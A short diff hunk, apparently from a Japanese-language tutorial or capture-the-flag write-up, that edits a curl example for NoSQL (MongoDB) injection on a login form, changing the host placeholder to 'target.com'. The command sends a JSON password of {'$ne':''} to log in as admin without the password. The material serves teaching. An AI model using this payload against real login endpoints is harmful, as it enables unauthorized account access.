@@ -33,7 +33,7 @@ NoSQL Injection（MongoDB Injection）を使います。ログインフォーム
 curl で JSON を送信：
 
 <Terminal
-  command={`curl -X POST https://サーバーのURL/login \\
+  command={`curl -X POST https://target.com/login \\
   -H "Content-Type: application/json" \\
   -d '{"username":"admin","password":{"$ne":""}}'`}
 />
